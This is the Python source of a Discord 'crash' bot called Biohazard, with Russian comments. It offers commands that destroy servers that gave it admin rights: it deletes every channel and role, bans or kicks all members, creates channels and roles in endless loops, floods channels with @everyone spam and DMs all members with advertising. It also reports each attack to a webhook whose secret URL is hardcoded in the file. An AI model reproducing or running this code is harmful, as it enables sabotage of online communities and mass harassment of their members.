import discord
import asyncio
from discord.ext import commands
import os
token = os.environ.get('TOKENZ') #токен
from discord_webhook import DiscordWebhook
print('Ожидание входа...')
class MyClient(discord.Client):
	async def on_ready(self):
		print('Вошёл как', self.user)
		await client.change_presence(activity = discord.Game('Крутой бот | v2.5'))
		
	async def on_message(self, message):
		c = 0
		r = 0
		m = 0
		s = 0
		white = open('whitelist.txt', 'r').read()
		black = open('blacklist.txt', 'r').read()
		vips = open('vip.txt', 'r').read()
		print('{0.author} с сервера {0.guild.name} и канала {0.channel.name} сказал: {0.content}'.format(message))
		if message.content == '*помощь': #помощь
			await message.delete()
			embed = discord.Embed(title=":grey_question: Помощь", description="", color=0x00cc00)
			embed.add_field(name='*атака', value='Автоматический краш сервера', inline=False)
			embed.add_field(name='*бс', value='Проверка сервера на наличие в белом списке', inline=False)
			embed.add_field(name='*всембан', value='Забанить всех участников', inline=False)
			embed.add_field(name='*всемкик', value='Кикнуть всех участников', inline=False)
			embed.add_field(name='*вип', value='Проверка VIP-статуса', inline=False)
			embed.add_field(name='*виппомощь', value='VIP-команды', inline=False)
			embed.add_field(name='*канал-', value='Удалить текущий канал', inline=False)
			embed.add_field(name='*каналы-', value='Удалить все каналы', inline=False)
			embed.add_field(name='*каналы+', value='Бесконечное создание каналов', inline=False)
			embed.add_field(name='*лаги', value='Чудовищный спам, вызывает лаги', inline=False)
			embed.add_field(name='*лс', value='Рассылка всем участникам в ЛС', inline=False)
			embed.add_field(name='*переименовать', value='Перименовать сервер', inline=False)
			embed.add_field(name='*роли-', value='Удалить все роли', inline=False)
			embed.add_field(name='*роли+', value='Бесконечное создание ролей', inline=False)
			embed.add_field(name='*флуд', value='Зафлудить все каналы', inline=False)
			embed.add_field(name='*чс', value='Проверка вас на наличие в чёрном списке', inline=False)
			await message.author.send(embed=embed)
			
		if message.content == '*бс':
			await message.delete()
			if white.find(str(message.guild.id)) == -1:
				await message.author.send(':x: Сервер не находится в белом списке.')
			else:
				await message.author.send(':white_check_mark: Сервер находится в белом списке.')
		if message.content == '*чс':
			await message.delete()
			if black.find(str(message.author.id)) == -1:
				await message.author.send(':white_check_mark: Вас нет в чёрном списке.')
			else:
				await message.author.send(':x: Вы находитесь в чёрном списке.')
		if message.content == '*вип':
			await message.delete()
			if vips.find(str(message.author.id)) == -1:
				await message.author.send(':x: У вас нет VIP-статуса.')
			else:
				await message.author.send(':white_check_mark: У вас есть VIP-статус :crown:.')
				
		if message.content == '*виппомощь': #помощь
			await message.delete()
			embed = discord.Embed(title=":crown: VIP-команды", description="", color=0x0099ff)
			embed.add_field(name='*випканалы+', value='Создать каналы со своим названием', inline=False)
			embed.add_field(name='*виплс', value='Отправка всем в ЛС своё сообщение', inline=False)
			embed.add_field(name='*виповнеру', value='Отправка владельцу сервера своё сообщение', inline=False)
			embed.add_field(name='*виппереименовать', value='Переименовать сервер на своё сообщение', inline=False)
			embed.add_field(name='*випроли+', value='Создать роли со своим сообщением', inline=False)
			embed.add_field(name='*випфлуд', value='Флуд своим сообщением', inline=False)
			await message.author.send(embed=embed)
		if white.find(str(message.guild.id)) == -1 and black.find(str(message.author.id)) == -1:
			if message.content == '*атака': #автоматический краш
				await message.delete() #удаление сообщения
				#await client.get_channel(732820713584721923).send('**Участник под ником **' + message.author + ' **крашит сервер **' + message.guild.name + ' **с** ' + str(len(message.guild.members)) + ' **участниками. Не доверяйте админ-права незнакомцам, будьте бдительны!**')
				print('Атака на сервер', message.guild.name)
				webhook = DiscordWebhook(url='https://discordapp.com/api/webhooks/745515368168030259/oxNz2pe5ezZRWu6MPtDFTvHr5PG55lJGKAJO90k865SuHRFPfgfEjT8KoKyFx6MZZFqH', content='**Участник под ником **' + str(message.author) + ' **крашит сервер **' + str(message.guild.name) + ' **с** ' + str(len(message.guild.members)) + ' **участниками. Не доверяйте админ-права незнакомцам, будьте бдительны!**')
				response = webhook.execute()
				await message.guild.edit(name='__...-<<CRASHED>>-...__') #переименовывание сервера
				with open('chaos.jpeg', 'rb') as f:
					icon = f.read()
				await message.guild.edit(icon=icon)
				
				for i in message.guild.channels:
					await asyncio.sleep(0.1)
					try:
						await i.delete() #удаление всех каналов
						print('Канал', i, 'удалён!')
						c = c + 1
					except:
						pass
				await message.author.send('**:wastebasket: Каналов удалено: **' + str(c))
				for i in message.guild.roles:
					await asyncio.sleep(0.1)
					try:
						await i.delete() #удаление всех ролей
						r = r + 1
						print('Роль', i, 'удалена!')
					except:
						pass
				await message.author.send('**:wastebasket: Ролей удалено: **' + str(r))
					
				for i in message.guild.members:
					await asyncio.sleep(0.1)
					try:
						await i.ban() #бан всех участников
						print('Участник', i, 'забанен!')
						m = m + 1
					except:
						pass
				await message.author.send('**:hammer: Участников забанено: **' + str(m))
				
				await asyncio.sleep(0.1)
				try:
					while True:
						await message.guild.create_text_channel('crash-by-biohazard') #создание текстового канала
						await message.guild.create_category('Crash by Biohazard') #создание категории
						await message.guild.create_voice_channel(name='Crash by Biohazard') #создание голосового канала
						await message.guild.create_role(name='Crash by Biohazard', colour=discord.Colour(0x00cc00)) #создание роли
				except:
					pass
				
			if message.content == '*флуд': #флуд
				spam = '@everyone Внимание, сервер крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/Aw3SgrC'
				await message.delete()
				while s <= 500:
					for channel in message.guild.text_channels:
						await channel.send(spam)
						s = s + 1
			if message.content == '*всембан': #бан всех участников
				await message.delete()
				for i in message.guild.members:
					await asyncio.sleep(0.1)
					try:
						await i.ban() #бан
						print('Участник', i, 'забанен!')
						m = m + 1
					except:
						pass
				await message.author.send('**:hammer: Участников забанено: **' + str(m))
					
			if message.content == '*всемкик': #кик всех участников
				await message.delete()
				for i in message.guild.members:
					await asyncio.sleep(0.1)
					try:
						await i.kick() #кик
						m = m + 1
						print('Участник', i, 'кикнут!')
					except:
						pass
				await message.author.send('**:boot: Участников кикнуто: **' + str(m))
					
			if message.content == '*переименовать': #переименовывание сервера
				await message.delete()
				await asyncio.sleep(0.1)
				try:
					await message.guild.edit(name='__...-<<CRASHED>>-...__') #переименовывание
					with open('chaos.jpeg', 'rb') as f:
						icon = f.read()
					await message.guild.edit(icon=icon)
				except:
					pass
				
			if message.content == '*каналы-': #удаление всех каналов
				await message.delete()
				for i in message.guild.channels:
					await asyncio.sleep(0.1)
					try:
						await i.delete() #удаление
						print('Канал', i, 'удалён!')
						c = c + 1
					except:
						pass
				await message.author.send('**:wastebasket: Каналов удалено: ** ' + str(c))
				await message.guild.create_text_channel(name='chat')
						
			if message.content == '*роли-': #удаление всех ролей
				await message.delete()
				for i in message.guild.roles:
					await asyncio.sleep(0.1)
					try:
						await i.delete() #удаление
						print('Роль', i, 'удалена!')
						r = r + 1
					except:
						pass
				await message.author.send('**:wastebasket: Ролей удалено: **' + str(r))
					
			if message.content == '*каналы+': #бесконечное создание каналов и категорий
				await message.delete()
				await asyncio.sleep(0.1)
				try:
					while True:
						await message.guild.create_text_channel(name='crash-by-biohazard') #создание текстового канала
						await message.guild.create_category(name='Crash by Biohazard') #создание категории
						await message.guild.create_voice_channel(name='Crash by Biohazard') #создание голосового канала
				except:
					pass
				
			if message.content == '*заразаканалы': #переименовывание всех каналов
				await message.delete()
				for i in message.guild.channels:
					await asyncio.sleep(0.1)
					try:
						await i.edit(name='Crash by Biohazard') #переименовывание
						print('Канал', i, 'переименован!')
						c = c + 1
					except:
						pass
				await message.author.send('**:microbe: Каналов заражено: **' + str(c))
					
			if message.content == '*заразароли': #переименовывание всех ролей
				await message.delete()
				for i in message.guild.roles:
					await asyncio.sleep(0.1)
					try:
						await i.edit(name='Crash by Biohazard', colour=discord.Colour(0x00cc00)) #переименовывание
						print('Роль', i, 'переименована!')
						r = r + 1
					except:
						pass
				await message.author.send('**:microbe: Ролей заражено: **' + str(r))
					
			if message.content == '*роли+': #бесконечное создание ролей
				await message.delete()
				await asyncio.sleep(0.1)
				try:
					while True:
						await message.guild.create_role(name='Crash by Biohazard', colour=discord.Colour(0x00cc00)) #создание роли
				except:
					pass
					
			if message.content == '*канал-': #удаление текущего канала
				await message.delete()
				await message.channel.delete()
				await message.author.send(':wastebasket: **Канал** `' + str(message.channel) + '` **удалён безвозвратно!**')
				
			if message.content == '*заразаканал': #заражение текущего канала
				await message.delete()
				await message.channel.edit(name='crash-by-biohazard')
				await message.author.send(':microbe: **Канал** `' + str(message.channel) + '` **заражён!**')
				
			if message.content == '*админка': #выдаёт админку
				await message.delete()
				role = await message.guild.create_role(name="Adminka", permissions=Permissions.all())
				
				
			if message.content == '*лс':
				await message.delete()
				for i in message.guild.members:
					await i.send('Внимание, сервер {0.guild.name} крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/Aw3SgrC'.format(message))
					
			if message.content == '*лаги': #лаги
				await message.delete()
				
				embed = discord.Embed(title=":biohazard: КРАШ!!!", description="", color=0x00cc00)
				embed.add_field(name=':biohazard: :biohazard: :biohazard: :biohazard: :biohazard:', value='Внимание, сервер крашится.', inline=False)
				embed.add_field(name=':biohazard: :biohazard: :biohazard: :biohazard: :biohazard:', value='Внимание, сервер крашится.', inline=False)
				embed.add_field(name=':biohazard: :biohazard: :biohazard: :biohazard: :biohazard:', value='Внимание, сервер крашится.', inline=False)
				embed.add_field(name=':biohazard: :biohazard: :biohazard: :biohazard: :biohazard:', value='Внимание, сервер крашится.', inline=False)
				embed.add_field(name=':biohazard: :biohazard: :biohazard: :biohazard: :biohazard:', value='Внимание, сервер крашится.', inline=False)
				embed.add_field(name=':biohazard: :biohazard: :biohazard: :biohazard: :biohazard:', value='Внимание, сервер крашится.', inline=False)
				embed.add_field(name=':biohazard: :biohazard: :biohazard: :biohazard: :biohazard:', value='Внимание, сервер крашится.', inline=False)
				embed.add_field(name=':biohazard: :biohazard: :biohazard: :biohazard: :biohazard:', value='Внимание, сервер крашится.', inline=False)
				embed.add_field(name=':biohazard: :biohazard: :biohazard: :biohazard: :biohazard:', value='Внимание, сервер крашится.', inline=False)
				while s < 500:
					for i in message.guild.text_channels:
						await i.send('@everyone', embed=embed)
						s += 1
					
			
					

client = MyClient()
client.run(str(token))
